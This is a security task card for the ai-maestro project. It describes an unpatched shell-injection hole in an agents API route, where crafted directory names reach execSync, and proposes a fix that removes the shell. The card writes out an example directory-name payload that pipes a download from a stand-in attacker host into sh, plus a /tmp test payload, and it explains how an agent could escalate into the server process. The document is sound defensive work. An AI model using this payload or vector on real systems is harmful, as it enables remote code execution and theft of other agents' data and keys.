---
trdd-id: JIHK7SWH
title: The agent-repos route shell-interpolates paths that were never metacharacter-validated
column: todo
scope: project
project-id: ai-maestro
repo: Emasoft/ai-maestro
created: 2026-08-22T04:16:16+0200
updated: 2026-08-22T04:30:42+0200
current-owner: ai-maestro-hub
created-by: ai-maestro-hub
assignee: ai-maestro-hub
task-type: security
min-approval-requirement: none
mandate: true
mandated-by: self
approved: true
approval-judge: ai-maestro-hub
approval-datetime: 2026-08-22T04:16:16+0200
derived: false
npt: []
eht: []
blocked-by: []
release-via: none
priority: 1
severity: high
effort: S
labels: [security, injection, api-route, agent-boundary]
external-refs: [TRDD-IMCEYV9F]
---

# The agent-repos route shell-interpolates paths that were never metacharacter-validated

> ## ⛔ DO NOT PUSH THIS CARD WHILE THE VECTOR IS UNPATCHED
>
> Measured 2026-08-22T04:30 — **both remotes are PUBLIC**:
> `Emasoft/ai-maestro` (the fork we push to) and `23blocks-OS/ai-maestro` (upstream) each
> report `visibility: PUBLIC, isPrivate: false`.
>
> This card describes a **live, unfixed** injection vector and spells out the payload
> shape. Pushing it before the fix lands publishes a working recipe against a running
> system, to anyone watching the repo, with no patch available. That is the one thing in
> this whole batch worth being careful about.
>
> **Order of operations: land the fix, THEN push both together.** The card is the fix's
> own record and should ship with it — not ahead of it.
>
> This is not a reason to delay the fix. It is a reason not to publish ahead of it.

## Problem

`app/api/agents/[id]/repos/route.ts` builds four shell command strings by interpolating
paths, and **two of the interpolated values are never checked for shell metacharacters.**
An agent that creates a directory with a crafted name inside its **own** working directory
gets arbitrary command execution **in the server process**.

That is a privilege escalation, not a lateral move. An agent already runs arbitrary code as
itself; the server is the process holding governance state, the registry, AMP keys, and
every other agent's data.

## What IS validated — read this first, because it is why the gap is easy to miss

Line 32 rejects `workDir` outright if it contains any of
`; & | \` $ ( ) { } ! # ' " \ < > * ? [ ] \n \r ~`, is non-absolute, or exceeds 2000 chars.
That check is real and it is good. **It is also applied to the wrong string**, twice over:

| # | value reaching a shell | validated? | how it gets there |
|---|---|---|---|
| 1 | `resolvedWorkDir` (line 55, the `find`) | **NO** — the metacharacter check ran on the PRE-`realpathSync` string | a symlink whose TARGET contains a quote resolves past the check |
| 2 | `resolvedRepoDir` (lines 75, 78, 87, the three `git` calls) | **NO** | it is `find` OUTPUT — a directory name discovered *under* the workdir, which no rule ever constrained |

Vector 2 is the practical one. Agents create directories as a matter of course, and

```
mkdir '/…/agent-workdir/x"; curl attacker.sh | sh; "'
```

is enough — the name lands in `find` output, is `path.resolve`d, passes the
`startsWith(resolvedWorkDir)` prefix check (it genuinely IS under the workdir), and is then
pasted into `` execSync(`git -C "${resolvedRepoDir}" …`) ``.

**`path.resolve` normalises paths. It does not escape shell metacharacters.** The existing
`// SEC:` comments at lines 62-64 and 72-74 are accurate about what they claim — traversal
and symlink escape — and are silent about quoting, which is the hole.

## Root cause

`execSync` runs its argument through a shell, so every interpolation is a quoting problem.
The prefix and traversal checks answer *"is this path inside the sandbox?"* and no check
answers *"is this path safe to paste into a shell?"* — and the second question only exists
because a shell is involved at all.

## Proposed fix

**Remove the shell, do not add escaping.** Escaping is a blocklist and this file already
demonstrates how a good blocklist gets applied to the wrong string.

1. Convert all three `git` calls to `execFileSync('git', [...args], { stdio: ['ignore','pipe','ignore'] })`.
   The array form goes straight to `execve`, so metacharacters are inert. `2>/dev/null`
   becomes the `stdio` entry — `lib/pillar/freshness.ts` already does exactly this.
2. Replace the `find` shell-out with a JS directory walk (depth 3, looking for `.git`).
   `fs.readdirSync` needs no quoting and removes the `realpathSync` vector with it.
3. Keep every existing check. They are correct for what they test; this adds the one nobody
   wrote.

## Verification

- A directory named `x"; touch /tmp/pwned-JIHK7SWH; "` created under a test agent's workdir
  produces **no** `/tmp/pwned-JIHK7SWH`, and the route still lists the other repos.
- Neuter: restore one `execSync` template → that test reddens. If it does not, the fixture's
  directory name is not reaching the call and the test proves nothing.

## Estimated risk

**LOW to apply, HIGH to leave.** The change is mechanical and local to one route. The three
`git` invocations have fixed argument shapes, so the array conversion is direct.

## Notes

Found by the `PostToolUse` security hook while editing this file for an unrelated reason
(`TRDD-IMCEYV9F`, adding `--no-optional-locks`). **The hook flagged the pattern; it did not
find the vector** — that took reading where each interpolated value comes from. Worth
recording because the first read of this file suggests it is already hardened: it has SEC
comments, a metacharacter blocklist, a traversal check and a prefix check. All four are
real, and none of them covers the value that actually reaches the shell.

## Acceptance

- [ ] All three `git` calls use `execFileSync` with an argument array; no shell.
- [ ] The `find` shell-out is replaced by a JS walk; `realpathSync` no longer feeds a shell.
- [ ] Every pre-existing check (metacharacter, traversal, prefix, existence) is retained.
- [ ] A test proves a crafted directory name under a workdir executes nothing.
- [ ] The neuter is recorded: which mutation, which test reddened, how many.

## Approval log

- 2026-08-22T04:16:16+0200 — MANDATE issued by ai-maestro-hub (min-approval-requirement:
  none). Pre-approved: Tier 0 — a local, reversible fix in this project's own source, no
  governance, baseline, or release surface. No approval request was sent.
